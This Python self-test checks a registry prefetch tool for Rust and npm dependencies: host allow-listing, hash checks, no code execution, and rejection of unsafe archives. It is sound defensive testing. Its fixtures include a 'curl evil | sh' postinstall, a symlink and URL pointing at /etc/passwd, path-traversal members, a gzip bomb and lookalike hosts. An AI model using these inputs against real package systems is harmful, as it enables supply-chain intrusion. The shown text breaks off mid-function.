#!/usr/bin/env python3
"""Offline self-test of prefetch.py, the registry prefetch for the dependency review.

    prefetch-selftest.py

Needs `yq` on PATH; nothing else, and no network. It loads prefetch.py with
importlib, makes every socket connection and name lookup raise, replaces the
module's `fetch` with recorded registry responses and archives built at test
time, and calls the module's `main` in-process on `tempfile.mkdtemp`
directories.

Cases: a fetched crate (build.rs, a build/ module, proc-macro) and a fetched
scoped npm package (a postinstall naming a script), with trimmed metadata
and only the selected files; nothing executed (markers,
execute bits, an AST rule on prefetch.py); the allowed hosts only (the URL
log, check_url, no proxy, no redirect, no Authorization header, blocked
sockets, the response cap); other sources refused with no request; hash
mismatches and missing hashes; unsafe archives (absolute, `..`, symlink,
hard link, FIFO, gzip bomb, member count, outside the top directory,
oversized selected file); proc-macro through `crate-type`; members equal
only under case or Unicode folding; data after the gzip stream; build and
install code that names files not copied, or that the scan cannot
follow (`partial`); errors of any kind
and non-regular members as `failed`, never a crash; the member cap on
selected files only and the npm version-document fallback; the release before
the locked one (`previous`) and the npm version's `time`, null for a first
release and in the version-document fallback, left out when the locked
version's publish time is missing; single-package failures; the CLI
(stale output, no packages.json, malformed input, bad arguments); Python
3.9 syntax and standard-library imports only.

After its own cases it runs screen-selftest.py, the offline self-test of the
plan-time dependency screen, as `sys.executable -I -B`, prints its output,
and counts a non-zero exit as one failure.

Prints one `ok` or `FAIL` line per check, then a count, and exits 0 only
when all passed.
"""

import ast
import base64
import contextlib
import hashlib
import importlib.util
import io
import json
import os
import shutil
import socket
import subprocess
import sys
import tarfile
import tempfile
import urllib.request
import zlib
from pathlib import Path

sys.dont_write_bytecode = True

HERE = Path(__file__).resolve().parent
SCRIPT = HERE / "prefetch.py"
STDLIB = frozenset(
    "argparse ast base64 contextlib hashlib importlib io json os re shutil socket subprocess sys tarfile tempfile"
    " time unicodedata posixpath urllib zlib pathlib".split()
)
CRATES = "registry+https://github.com/rust-lang/crates.io-index"
YQ_ARGV = ["yq", "-p=toml", "-o=json", "."]


class SelfTest:
    def __init__(self):
        self.failed = 0
        self.passed = 0

    def check(self, name: str, condition: bool, detail: str = "") -> bool:
        if condition:
            self.passed += 1
            print(f"ok   {name}")
        else:
            self.failed += 1
            print(f"FAIL {name}" + (f": {detail}" if detail else ""))
        return condition


T = SelfTest()
BLOCKED = []


def blocked(*args, **kwargs):
    BLOCKED.append(args[1:] if args else kwargs)
    raise OSError("network blocked by prefetch-selftest")


socket.socket.connect = blocked
socket.socket.connect_ex = blocked
socket.getaddrinfo = blocked
socket.create_connection = blocked

SPEC = importlib.util.spec_from_file_location("prefetch", SCRIPT)
P = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(P)
REAL_FETCH = P.fetch
P.RATE_DELAY = 0
SEEN = []


# --- fixtures ---------------------------------------------------------------


def tgz(members: list) -> bytes:
    """A .tar.gz of members: (name, data) for a file, or (name, kind[, linkname]) with kind dir, sym, lnk or fifo."""
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w:gz", format=tarfile.GNU_FORMAT) as tar:
        for member in members:
            info = tarfile.TarInfo(member[0])
            info.mode = 0o755
            if isinstance(member[1], bytes):
                info.size = len(member[1])
                tar.addfile(info, io.BytesIO(member[1]))
                continue
            info.type = KINDS[member[1]]
            if member[1] in ("sym", "lnk"):
                info.linkname = member[2]
            tar.addfile(info)
    return buffer.getvalue()


KINDS = {"dir": tarfile.DIRTYPE, "sym": tarfile.SYMTYPE, "lnk": tarfile.LNKTYPE, "fifo": tarfile.FIFOTYPE}


def sha512(data: bytes) -> str:
    return "sha512-" + base64.b64encode(hashlib.sha512(data).digest()).decode("ascii")


class Fixture:
    def __init__(self, tmp: Path):
        self.marker_build = tmp / "build-ran"
        self.marker_install = tmp / "install-ran"
        self.crate_files = {
            "Cargo.toml": b'[package]\nname = "goodcrate"\nversion = "1.2.3"\nbuild = "build.rs"\n\n'
            b"[lib]\nproc-macro = true\n",
            "build.rs": f'fn main() {{ std::fs::write("{self.marker_build}", "ran").unwrap(); }}\n'.encode(),
            "build/helper.rs": b"pub fn help() {}\n",
            "src/lib.rs": b"mod other;\npub fn lib() {}\n",
            "src/other.rs": b"pub fn other() {}\n",
            "README.md": b"SECRET-README\n",
            "nested/Cargo.toml": b'[package]\nname = "nested"\n',
        }
        self.npm_files = {
            "package.json": json.dumps(
                {
                    "name": "@scope/pkg",
                    "version": "2.0.0",
                    "scripts": {"postinstall": f"node scripts/post.js; touch {self.marker_install}"},
                }
            ).encode(),
            "scripts/post.js": b"const fs = require('fs');\nconsole.log('post');\n",
            "index.js": b"module.exports = 1;\n",
            "README.md": b"SECRET-README\n",
        }
        self.crate = self.crate_archive("goodcrate", "1.2.3", self.crate_files)
        self.npm = tgz([("package", "dir")] + [("package/" + k, v) for k, v in self.npm_files.items()])
        self.routes = {}
        self.add_crate("goodcrate", "1.2.3", self.crate)
        self.add_npm("@scope/pkg", "2.0.0", self.npm)

    @staticmethod
    def crate_archive(name: str, version: str, files: dict) -> bytes:
        top = f"{name}-{version}"
        return tgz([(top, "dir")] + [(f"{top}/{k}", v) for k, v in files.items()])

    def add_crate(self, name: str, version: str, archive: bytes, pad: int = 0) -> None:
        api = f"https://crates.io/api/v1/crates/{name}"
        self.routes[api] = json.dumps(
            {
                "crate": {
                    "name": name,
                    "description": "DESCRIPTION-TEXT" + "x" * pad,
                    "created_at": "2020-01-01T00:00:00Z",
                    "updated_at": "2026-01-01T00:00:00Z",
                    "downloads": 1000,
                    "recent_downloads": 100,
                    "repository": "https://github.com/example/goodcrate",
                    "homepage": None,
                    "readme": "SECRET-README",
                },
                "versions": [
                    {
                        "num": "1.0.0",
                        "created_at": "2020-01-01T00:00:00Z",
                        "yanked": True,
                        "license": "MIT",
                        "published_by": {"login": "carol", "name": "Carol"},
                    },
                    {
                        "num": version,
                        "created_at": "2026-01-01T00:00:00Z",
                        "yanked": False,
                        "license": "MIT OR Apache-2.0",
                        "published_by": {"login": "alice", "name": "Alice", "avatar": "https://x/a.png"},
                        "downloads": 10,
                        "rust_version": "1.70",
                        "readme_path": "SECRET-README",
                    },
                ],
            }
        ).encode()
        self.routes[api + "/owners"] = json.dumps(
            {"users": [{"login": "alice", "kind": "user", "name": "Alice", "email": "alice@example.invalid"}]}
        ).encode()
        self.routes[f"https://static.crates.io/crates/{name}/{name}-{version}.crate"] = archive

    def add_npm(self, name: str, version: str, archive: bytes, tarball: str = None) -> None:
        tarball = tarball or f"https://registry.npmjs.org/{name}/-/{name.split('/')[-1]}-{version}.tgz"
        release = {
            "name": name,
            "version": version,
            "description": "DESCRIPTION-TEXT",
            "dist": {"tarball": tarball, "integrity": sha512(archive)},
            "_npmUser": {"name": "bob", "email": "bob@example.invalid"},
            "maintainers": [{"name": "bob", "email": "bob@example.invalid"}],
            "license": "MIT",
            "repository": {"type": "git", "url": "git+https://github.com/example/pkg.git"},
            "scripts": {"postinstall": "node scripts/post.js; touch marker", "test": "x" * 5000},
            "hasInstallScript": True,
        }
        self.routes[P.NPM_TARBALLS + name.replace("/", "%2f")] = json.dumps(
            {
                "name": name,
                "description": "DESCRIPTION-TEXT",
                "readme": "SECRET-README",
                "maintainers": [{"name": "bob", "email": "bob@example.invalid"}],
                "time": {
                    "created": "2020-01-01T00:00:00Z",
                    "modified": "2026-01-01T00:00:00Z",
                    "1.0.0": "2020-01-01T00:00:00Z",
                    version: "2026-01-01T00:00:00Z",
                },
                "versions": {
                    "1.0.0": {"deprecated": "use 2", "_npmUser": {"name": "carol", "email": "carol@example.invalid"}},
                    version: release,
                },
            }
        ).encode()
        self.routes[tarball] = archive


def entry(ecosystem: str, name: str, version: str, registry: bool = True, digest: str = None, source: str = None):
    return {
        "ecosystem": ecosystem,
        "lockfile": "Cargo.lock" if ecosystem == "cargo" else "web/pnpm-lock.yaml",
        "name": name,
        "version": version,
        "previous": [],
        "source": source or (CRATES if ecosystem == "cargo" else "registry"),
        "registry": registry,
        "direct": True,
        "checksum": digest if ecosystem == "cargo" else None,
        "integrity": digest if ecosystem == "npm" else None,
    }


class Fake:
    """Recorded responses by URL; enforces the cap like fetch; logs every URL."""

    def __init__(self, routes: dict):
        self.routes = routes
        self.log = []

    def __call__(self, url: str, cap: int) -> bytes:
        P.check_url(url)
        self.log.append(url)
        SEEN.append(url)
        if url not in self.routes:
            raise P.FetchError(f"{url}: HTTP 404")
        if len(self.routes[url]) > cap:
            raise P.OverCap(f"{url}: response over {cap} bytes")
        return self.routes[url]


class Box:
    def __init__(self, tmp: Path):
        self.tmp = tmp
        self.counter = 0

    def run(self, packages: list, routes: dict) -> tuple:
        """(exit, out dir, prefetch.json or None, the fake) after main on a fresh dir holding packages."""
        self.counter += 1
        out = self.tmp / f"out-{self.counter}"
        out.mkdir()
        (out / "packages.json").write_text(json.dumps({"packages": packages, "problems": []}), encoding="utf-8")
        fake = Fake(routes)
        P.fetch = fake
        with contextlib.redirect_stdout(io.StringIO()), contextlib.redirect_stderr(io.StringIO()):
            code = P.main(["--dir", str(out)])
        result = out / "prefetch.json"
        return code, out, (json.loads(result.read_text(encoding="utf-8")) if result.exists() else None), fake


@contextlib.contextmanager
def lowered(**caps):
    saved = {k: getattr(P, k) for k in caps}
    for k, v in caps.items():
        setattr(P, k, v)
    try:
        yield
    finally:
        for k, v in saved.items():
            setattr(P, k, v)


def statuses(result) -> list:
    return [(r["name"], r["status"]) for r in result["packages"]] if result else None


def files_of(out: Path, relative: str) -> dict:
    metadata = json.loads((out / relative / "metadata.json").read_text(encoding="utf-8"))
    return metadata, {f["archive_path"]: (out / relative / f["file"]).read_bytes() for f in metadata["files"]}


# --- cases ------------------------------------------------------------------


def fetched(box: Box, fx: Fixture):
    crate_sum = hashlib.sha256(fx.crate).hexdigest()
    packages = [
        entry("cargo", "goodcrate", "1.2.3", digest=crate_sum),
        dict(entry("cargo", "goodcrate", "1.2.3", digest=crate_sum), lockfile="tools/Cargo.lock"),
        entry("npm", "@scope/pkg", "2.0.0", digest=sha512(fx.npm)),
    ]
    code, out, result, fake = box.run(packages, fx.routes)
    T.check("fetched: exit 0", code == 0)
    expected = [("goodcrate", "fetched"), ("goodcrate", "fetched"), ("@scope/pkg", "fetched")]
    if not T.check("fetched: prefetch.json says fetched", statuses(result) == expected, str(result)):
        return out
    dirs = [r["dir"] for r in result["packages"]]
    T.check("fetched: dirs", dirs == ["cargo/goodcrate@1.2.3"] * 2 + ["npm/@scope/pkg@2.0.0"], str(dirs))
    archive_url = "https://static.crates.io/crates/goodcrate/goodcrate-1.2.3.crate"
    T.check("fetched: a package listed twice is fetched once", fake.log.count(archive_url) == 1, str(fake.log))

    metadata, copied = files_of(out, "cargo/goodcrate@1.2.3")
    wanted = ["Cargo.toml", "build.rs", "build/helper.rs", "src/lib.rs", "src/other.rs"]
    T.check("crate: exactly the selected files", sorted(copied) == wanted, str(sorted(copied)))
    T.check("crate: the deeper Cargo.toml is not selected", "nested/Cargo.toml" not in copied)
    T.check("crate: copied bytes match", all(copied[p] == fx.crate_files[p] for p in copied))
    names = sorted(p.name for p in (out / "cargo/goodcrate@1.2.3/files").iterdir())
    T.check("crate: numbered names", names == ["1.txt", "2.txt", "3.txt", "4.txt", "5.txt"], str(names))
    T.check("crate: build_time", metadata["build_time"] == ["build.rs", "proc-macro"], str(metadata["build_time"]))
    registry = metadata["registry"]
    T.check(
        "crate: publisher and owners",
        registry["version"]["published_by"] == "alice" and registry["owners"] == [{"kind": "user", "login": "alice"}],
        str(registry),
    )
    T.check("crate: history newest first", [h["num"] for h in registry["history"]] == ["1.2.3", "1.0.0"])
    T.check(
        "crate: the release before the locked one",
        registry["previous"] == {"num": "1.0.0", "created_at": "2020-01-01T00:00:00Z", "published_by": "carol"},
        str(registry.get("previous")),
    )
    T.check(
        "crate: trimmed fields",
        registry["crate"]["downloads"] == 1000
        and registry["version"]["license"] == "MIT OR Apache-2.0"
        and registry["version"]["yanked"] is False
        and registry["versions_count"] == 2,
        str(registry),
    )

    metadata, copied = files_of(out, "npm/@scope/pkg@2.0.0")
    T.check(
        "npm: exactly the selected files",
        sorted(copied) == ["package.json", "scripts/post.js"],
        str(sorted(copied)),
    )
    T.check("npm: build_time", metadata["build_time"] == ["postinstall"], str(metadata["build_time"]))
    registry = metadata["registry"]
    T.check(
        "npm: trimmed fields",
        registry["maintainers"] == ["bob"]
        and registry["publisher"] == "bob"
        and registry["hasInstallScript"] is True
        and registry["downloads"] == "unavailable"
        and registry["license"] == "MIT"
        and registry["repository"] == "git+https://github.com/example/pkg.git"
        and registry["history"][1] == {"version": "1.0.0", "time": "2020-01-01T00:00:00Z", "deprecated": True},
        str(registry),
    )
    T.check("npm: scripts cut", len(registry["scripts"]["test"]) == P.SCRIPT_CAP)
    T.check("npm: the locked version's time", registry["time"] == "2026-01-01T00:00:00Z", str(registry.get("time")))
    T.check(
        "npm: the release before the locked one",
        registry["previous"] == {"version": "1.0.0", "time": "2020-01-01T00:00:00Z", "publisher": "carol"},
        str(registry.get("previous")),
    )
    text = "\n".join(p.read_text(encoding="utf-8") for p in out.rglob("metadata.json"))
    for word in ("DESCRIPTION-TEXT", "SECRET-README", "@example.invalid", "avatar"):
        T.check(f"metadata: no {word}", word not in text)
    return out


def nothing_executed(out: Path, fx: Fixture):
    T.check("nothing executed: no build.rs marker", not fx.marker_build.exists())
    T.check("nothing executed: no postinstall marker", not fx.marker_install.exists())
    modes = [p for p in out.rglob("*") if p.is_file() and p.stat().st_mode & 0o111]
    T.check("nothing executed: no execute bit", not modes, str(modes))
    tree = ast.parse(SCRIPT.read_text(encoding="utf-8"))
    parents = {}
    for node in ast.walk(tree):
        for child in ast.iter_child_nodes(node):
            parents[child] = node

    def inside(node) -> str:
        while node in parents:
            node = parents[node]
            if isinstance(node, ast.FunctionDef):
                return node.name
        return ""

    uses = [n for n in ast.walk(tree) if isinstance(n, ast.Name) and n.id == "subprocess"]
    T.check("AST: subprocess used only in run_yq", uses and all(inside(n) == "run_yq" for n in uses))
    calls = [
        n
        for n in ast.walk(tree)
        if isinstance(n, ast.Call)
        and isinstance(n.func, ast.Attribute)
        and isinstance(n.func.value, ast.Name)
        and n.func.value.id == "subprocess"
    ]
    fixed = (
        len(calls) == 1
        and calls[0].func.attr == "run"
        and isinstance(calls[0].args[0], ast.List)
        and [getattr(e, "value", None) for e in calls[0].args[0].elts] == YQ_ARGV
    )
    T.check("AST: one subprocess.run with the fixed yq argv", fixed)
    bad = []
    for node in ast.walk(tree):
        if isinstance(node, ast.Attribute):
            attr = node.attr
            if attr in ("system", "popen", "extract", "extractall") or attr.startswith(("exec", "spawn")):
                bad.append(attr)
        elif isinstance(node, ast.Name) and node.id in ("eval", "exec", "compile", "__import__", "os"):
            bad.append(node.id)
    T.check("AST: no os.system, exec, spawn, eval, extract or extractall", not bad, str(bad))


def hosts():
    T.check("hosts: every fetched URL is https on an allowed host", SEEN and all(ok(url) for url in SEEN))
    for url in (
        "http://registry.npmjs.org/x",
        "https://evil.example/x",
        "https://user:pw@crates.io/x",
        "https://crates.io:8443/x",
        "https://registry.npmjs.org.evil.example/x",
        "file:///etc/passwd",
    ):
        T.check(f"hosts: check_url refuses {url}", not ok(url))
    saved = os.environ.get("HTTPS_PROXY")
    os.environ["HTTPS_PROXY"] = "http://proxy.example:3128"
    try:
        built = P.opener()
    finally:
        if saved is None:
            os.environ.pop("HTTPS_PROXY")
        else:
            os.environ["HTTPS_PROXY"] = saved
    proxies = [h.proxies for h in built.handlers if isinstance(h, urllib.request.ProxyHandler)]
    T.check("hosts: no proxy even with HTTPS_PROXY", all(p == {} for p in proxies), str(proxies))
    proxy_opens = [h for h in built.handlers if hasattr(h, "proxy_open") and getattr(h, "proxies", None)]
    T.check("hosts: no handler opens through a proxy", not proxy_opens, str(proxy_opens))
    redirects = [type(h) for h in built.handlers if isinstance(h, urllib.request.HTTPRedirectHandler)]
    T.check("hosts: only the refusing redirect handler", redirects == [P.Refuse], str(redirects))
    request = P.make_request("https://crates.io/x")
    T.check(
        "hosts: a 302 is refused",
        P.Refuse().redirect_request(request, None, 302, "Found", {}, "https://evil.example/") is None,
    )
    headers = {k.lower() for k, _ in request.header_items()}
    T.check("hosts: only User-Agent and Accept headers", headers == {"user-agent", "accept"}, str(headers))
    before = len(BLOCKED)
    T.check(
        "hosts: the real fetch with sockets blocked fails",
        raises(lambda: REAL_FETCH("https://registry.npmjs.org/x", 100)),
    )
    T.check("hosts: the socket block was hit", len(BLOCKED) > before)
    T.check("hosts: the real fetch refuses another host", raises(lambda: REAL_FETCH("https://evil.example/x", 100)))

    class Response(io.BytesIO):
        pass

    class Opener:
        def __init__(self, body: bytes):
            self.body = body

        def open(self, request, timeout):
            return Response(self.body)

    saved_opener = P.opener
    try:
        P.opener = lambda: Opener(b"x" * 100)
        T.check(
            "hosts: the real fetch returns a body at its cap",
            REAL_FETCH("https://registry.npmjs.org/x", 100) == b"x" * 100,
        )
        T.check(
            "hosts: the real fetch fails above its cap", raises(lambda: REAL_FETCH("https://registry.npmjs.org/x", 99))
        )
    finally:
        P.opener = saved_opener


def ok(url: str) -> bool:
    try:
        P.check_url(url)
    except P.FetchError:
        return False
    return url.startswith("https://")


def raises(call) -> bool:
    try:
        call()
    except P.FetchError:
        return True
    return False


def other_sources(box: Box, fx: Fixture):
    packages = [
        entry("cargo", "gitdep", "0.2.0", registry=False, digest="00", source="git+https://example.invalid/g#1"),
        entry("cargo", "lookalike", "0.1.0", registry=False, digest="00", source=CRATES + "-evil"),
        entry("npm", "tarpkg", "1.0.0", registry=False, source="https://example.invalid/tarpkg-1.0.0.tgz"),
        entry("cargo", "bad.name", "1.0.0", digest="00"),
        entry("npm", "Upper", "1.0.0", digest="sha512-AA=="),
        entry("cargo", "okname", "1.0.0/../x", digest="00"),
    ]
    code, out, result, fake = box.run(packages, fx.routes)
    T.check("other sources: all refused", statuses(result) == [(p["name"], "refused") for p in packages], str(result))
    T.check("other sources: no request", fake.log == [], str(fake.log))
    T.check("other sources: no directories", not (out / "cargo").exists() and not (out / "npm").exists())
    routes = dict(fx.routes)
    fx2 = Fixture.__new__(Fixture)
    fx2.routes = routes
    Fixture.add_npm(fx2, "elsewhere", "1.0.0", fx.npm, tarball="https://evil.example/elsewhere-1.0.0.tgz")
    code, out, result, fake = box.run([entry("npm", "elsewhere", "1.0.0", digest=sha512(fx.npm))], routes)
    T.check("dist.tarball elsewhere: refused", statuses(result) == [("elsewhere", "refused")], str(result))
    T.check("dist.tarball elsewhere: not fetched", fake.log == [P.NPM_TARBALLS + "elsewhere"], str(fake.log))


def integrity(box: Box, fx: Fixture):
    packages = [
        entry("cargo", "goodcrate", "1.2.3", digest="0" * 64),
        entry("npm", "@scope/pkg", "2.0.0", digest=sha512(b"other")),
        entry("npm", "@scope/pkg", "2.0.0", digest="sha1-" + base64.b64encode(b"x" * 20).decode()),
    ]
    code, out, result, fake = box.run(packages, fx.routes)
    T.check("integrity: mismatches failed", statuses(result) == [(p["name"], "failed") for p in packages], str(result))
    T.check("integrity: no package directory", not (out / "cargo").exists() and not (out / "npm").exists())
    code, out, result, fake = box.run(
        [entry("cargo", "goodcrate", "1.2.3"), entry("npm", "@scope/pkg", "2.0.0")], fx.routes
    )
    T.check("integrity: missing hashes refused", [s for _, s in statuses(result)] == ["refused"] * 2, str(result))
    T.check("integrity: missing hashes make no request", fake.log == [])


def archives(box: Box, fx: Fixture):
    top = "evil-1.0.0"
    base = [(top, "dir"), (f"{top}/Cargo.toml", b'[package]\nname = "evil"\n')]
    cases = {
        "an absolute member": (base + [("/tmp/evil", b"x")], {}, "an absolute path"),
        "a .. member": (base + [(f"{top}/../escape", b"x")], {}, "component"),
        "a symlink": (base + [(f"{top}/link", "sym", "/etc/passwd")], {}, "a link"),
        "a hard link": (base + [(f"{top}/hard", "lnk", f"{top}/Cargo.toml")], {}, "a link"),
        "a FIFO": (base + [(f"{top}/fifo", "fifo")], {}, "not a regular file or a directory"),
        "a gzip bomb": (base + [(f"{top}/zeros", b"\0" * 200000)], {"TOTAL_CAP": 100000}, "decompressed"),
        "too many members": (base + [(f"{top}/f{i}", b"x") for i in range(10)], {"MEMBER_COUNT": 5}, "over 5 members"),
        "a member outside the top directory": (base + [("other/x", b"x")], {}, "outside"),
        "an oversized selected file": (
            base + [(f"{top}/build.rs", b"x" * 2000)],
            {"COPY_CAP": 1000},
            "build.rs is over",
        ),
    }
    for label, (members, caps, why) in cases.items():
        archive = tgz(members)
        routes = {}
        fx2 = Fixture.__new__(Fixture)
        fx2.routes = routes
        Fixture.add_crate(fx2, "evil", "1.0.0", archive)
        with lowered(**caps):
            code, out, result, _ = box.run(
                [entry("cargo", "evil", "1.0.0", digest=hashlib.sha256(archive).hexdigest())], routes
            )
        T.check(f"archive {label}: failed", statuses(result) == [("evil", "failed")], str(result))
        reason = result["packages"][0]["reason"] if result else ""
        T.check(f"archive {label}: the reason names it", why in reason, reason)
        T.check(f"archive {label}: no directory", not (out / "cargo").exists())


def failures(box: Box, fx: Fixture):
    routes = dict(fx.routes)
    fx2 = Fixture.__new__(Fixture)
    fx2.routes = routes
    Fixture.add_crate(fx2, "bigmeta", "1.0.0", fx.crate, pad=50000)
    packages = [
        entry("cargo", "missing", "1.0.0", digest="00"),
        entry("cargo", "bigmeta", "1.0.0", digest="00"),
        entry("cargo", "goodcrate", "1.2.3", digest=hashlib.sha256(fx.crate).hexdigest()),
        entry("npm", "@scope/pkg", "2.0.0", digest=sha512(fx.npm)),
    ]
    with lowered(CRATES_META_CAP=40000):
        code, out, result, _ = box.run(packages, routes)
    T.check("failures: exit 0", code == 0)
    expected = [("missing", "failed"), ("bigmeta", "failed"), ("goodcrate", "fetched"), ("@scope/pkg", "fetched")]
    T.check("failures: one failure does not stop the others", statuses(result) == expected, str(result))
    reasons = [r["reason"] for r in result["packages"][:2]] if result else []
    T.check(
        "failures: reasons name the 404 and the cap",
        len(reasons) == 2 and "404" in reasons[0] and "over" in reasons[1],
        str(reasons),
    )


# --- review round 1 ---------------------------------------------------------


def one_crate(box: Box, files: dict, caps: dict = None, raw: bytes = None, name: str = "rc") -> tuple:
    """(prefetch.json record, metadata.json or None) for a crate rc 1.0.0 holding files (or the archive raw)."""
    archive = raw if raw is not None else Fixture.crate_archive(name, "1.0.0", files)
    holder = Fixture.__new__(Fixture)
    holder.routes = {}
    Fixture.add_crate(holder, name, "1.0.0", archive)
    with lowered(**(caps or {})):
        _, out, result, _ = box.run(
            [entry("cargo", name, "1.0.0", digest=hashlib.sha256(archive).hexdigest())], holder.routes
        )
    return outcome(out, result)


def one_npm(box: Box, files: dict = None, raw: bytes = None, caps: dict = None, routes: dict = None) -> tuple:
    """(prefetch.json record, metadata.json or None) for an npm package rp 1.0.0 holding files (or the archive raw)."""
    archive = raw if raw is not None else tgz([("package/" + k, v) for k, v in files.items()])
    holder = Fixture.__new__(Fixture)
    holder.routes = {}
    Fixture.add_npm(holder, "rp", "1.0.0", archive)
    holder.routes.update(routes or {})
    with lowered(**(caps or {})):
        _, out, result, _ = box.run([entry("npm", "rp", "1.0.0", digest=sha512(archive))], holder.routes)
    return outcome(out, result)


def outcome(out: Path, result) -> tuple:
    record = result["packages"][0] if result else {}
    metadata = None
    if record.get("dir"):
        metadata = json.loads((out / record["dir"] / "metadata.json").read_text(encoding="utf-8"))
    return record, metadata


def copied_paths(metadata) -> list:
    return sorted(f["archive_path"] for f in metadata["files"]) if metadata else None


CARGO = b'[package]\nname = "rc"\nversion = "1.0.0"\n'


def proc_macro_forms(box: Box):
    for label, lib in (
        ("crate-type", b'[lib]\ncrate-type = ["proc-macro"]\n'),
        ("crate_type", b'[lib]\ncrate_type = ["rlib", "proc-macro"]\n'),
    ):
        record, metadata = one_crate(box, {"Cargo.toml": CARGO + lib, "src/lib.rs": b"pub fn m() {}\n"})
        found = metadata["build_time"] if metadata else record
        T.check(f"F1 {label}: a proc-macro", found == ["proc-macro"], str(found))
        T.check(f"F1 {label}: the lib root copied", copied_paths(metadata) == ["Cargo.toml", "src/lib.rs"])
    for label, lib in (
        ("a crate-type string", b'[lib]\ncrate-type = "proc-macro"\n'),
        ("a non-boolean proc-macro", b'[lib]\nproc-macro = "yes"\n'),
        ("a lib that is not a table", b'lib = "x"\n'),
    ):
        manifest = lib + CARGO if lib.startswith(b"lib") else CARGO + lib
        record, metadata = one_crate(box, {"Cargo.toml": manifest, "src/lib.rs": b"pub fn m() {}\n"})
        T.check(f"F1 {label}: undetermined", metadata and metadata["build_time"] == "undetermined", str(record))


def case_folding(box: Box):
    cases = {
        "Build.rs with no build key": {"Cargo.toml": CARGO, "Build.rs": b"fn main() {}\n"},
        "Cargo.toml and CARGO.TOML": {"Cargo.toml": CARGO, "CARGO.TOML": CARGO + b'build = "x.rs"\n'},
        "a build key matching only folded": {"Cargo.toml": CARGO + b'build = "build.rs"\n', "BUILD.rs": b"x\n"},
        "NFC and NFD names": {"Cargo.toml": CARGO, "src/café.rs": b"x\n", "src/café.rs": b"y\n"},
        "a lib directory matching only folded": {
            "Cargo.toml": CARGO + b"[lib]\nproc-macro = true\n",
            "src/lib.rs": b"mod x;\n",
            "SRC/x.rs": b"x\n",
        },
    }
    for label, files in cases.items():
        record, _ = one_crate(box, files)
        T.check(f"F2 {label}: failed", record.get("status") == "failed" and folded(record), str(record))
    record, _ = one_npm(box, {"package.json": b'{"name": "rp"}', "Binding.gyp": b"{}\n"})
    T.check("F2 npm Binding.gyp: failed", record.get("status") == "failed" and folded(record), str(record))
    record, _ = one_npm(box, {"package.json": b'{"name": "rp"}', "PACKAGE.JSON": b"{}"})
    T.check(
        "F2 npm package.json and PACKAGE.JSON: failed", record.get("status") == "failed" and folded(record), str(record)
    )


def folded(record: dict) -> bool:
    return "collides" in record.get("reason", "") or "only when case is ignored" in record.get("reason", "")


def gzip_tail(box: Box):
    benign = tgz([("package/package.json", b'{"name": "rp"}')])
    hostile = tgz([("package/package.json", b'{"name": "rp", "scripts": {"postinstall": "curl evil | sh"}}')])
    for label, raw in (("a second gzip member", benign + hostile), ("trailing bytes", benign + b"TRAILING-GARBAGE")):
        record, _ = one_npm(box, raw=raw)
        T.check(f"F3 {label}: failed", record.get("status") == "failed", str(record))
        T.check(f"F3 {label}: the reason names it", "after its gzip stream" in record.get("reason", ""), str(record))


def stream_ends(box: Box):
    member = ("package/package.json", b'{"name": "rp"}')
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w", format=tarfile.GNU_FORMAT) as tar:
        info = tarfile.TarInfo(member[0])
        info.size = len(member[1])
        tar.addfile(info, io.BytesIO(member[1]))
    packer = zlib.compressobj(9, zlib.DEFLATED, 16 + zlib.MAX_WBITS)
    trailing = packer.compress(buffer.getvalue() + b"TRAILING-GARBAGE") + packer.flush()
    for label, raw, reason in (
        ("a truncated gzip stream", tgz([member])[:-8], "truncated"),
        ("data after the tar end", trailing, "after its end"),
    ):
        record, _ = one_npm(box, raw=raw)
        T.check(f"F3 {label}: failed", record.get("status") == "failed", str(record))
        T.check(f"F3 {label}: the reason names it", reason in record.get("reason", ""), str(record))


def build_code(box: Box):
    files = {
        "Cargo.toml": CARGO + b"[lib]\nproc-macro = true\n",
        "src/lib.rs": b"mod evil;\nmod deep;\n",
        "src/evil.rs": b"pub fn evil() {}\n",
        "src/deep/mod.rs": b"mod inner;\n",
        "src/deep/inner.rs": b"\n",
        "tests/t.rs": b"\n",
    }
    record, metadata = one_crate(box, files)
    wanted = ["Cargo.toml", "src/deep/inner.rs", "src/deep/mod.rs", "src/evil.rs", "src/lib.rs"]
    T.check("F4 proc-macro: every .rs under the lib root directory", copied_paths(metadata) == wanted, str(record))
    T.check("F4 proc-macro: modules resolved, not partial", metadata and metadata["build_time"] == ["proc-macro"])
    for label, script, extra in (
        ("a #[path] module", b'#[path = "src/net.rs"] mod net;\nfn main() {}\n', {"src/net.rs": b"\n"}),
        ("a module beside build.rs", b"mod helper;\nfn main() {}\n", {"helper.rs": b"\n"}),
        ("an include!", b'include!("gen.rs");\n', {"gen.rs": b"\n"}),
    ):
        record, metadata = one_crate(box, dict({"Cargo.toml": CARGO, "build.rs": script}, **extra))
        T.check(f"F4 build.rs with {label}: partial", metadata and metadata["build_time"] == "partial", str(record))
        T.check(f"F4 build.rs with {label}: found kept", metadata and metadata["found"] == ["build.rs"])
    custom = CARGO + b'build = "build/main.rs"\n'
    record, metadata = one_crate(box, {"Cargo.toml": custom, "build/main.rs": b"mod m;\n", "build/m.rs": b"\n"})
    found = metadata["build_time"] if metadata else record
    T.check("F4 a build/main.rs with a build/ module: not partial", found == ["build=build/main.rs"], str(found))
    hook = b'{"name": "rp", "scripts": {"postinstall": "node scripts/post.js"}}'
    for label, script, expected in (
        ("a relative require of an uncopied file", b'require("./lib/helper");\n', "partial"),
        ("a dynamic require", b"require(name);\n", "partial"),
        ("a missing relative require", b'require("./gone");\n', "partial"),
        ("a builtin require only", b'const fs = require("fs");\n', ["postinstall"]),
    ):
        files = {"package.json": hook, "scripts/post.js": script, "scripts/lib/helper.js": b"\n"}
        record, metadata = one_npm(box, files)
        build_time = metadata["build_time"] if metadata else record
        T.check(f"F4 install script with {label}: {expected}", build_time == expected, str(build_time))
    shell = b'{"name": "rp", "scripts": {"install": "sh setup.sh"}}'
    record, metadata = one_npm(box, {"package.json": shell, "setup.sh": b"./other\n"})
    T.check("F4 a shell install script: partial", metadata and metadata["build_time"] == "partial", str(record))
    record, metadata = one_npm(box, {"package.json": b'{"name": "rp"}', "binding.gyp": b"{}\n"})
    T.check("F4 binding.gyp: partial", metadata and metadata["build_time"] == "partial", str(record))


def fooled_scan(box: Box):
    main = CARGO + b'build = "build/main.rs"\n'
    proc = CARGO + b"[lib]\nproc-macro = true\n"
    cases = {
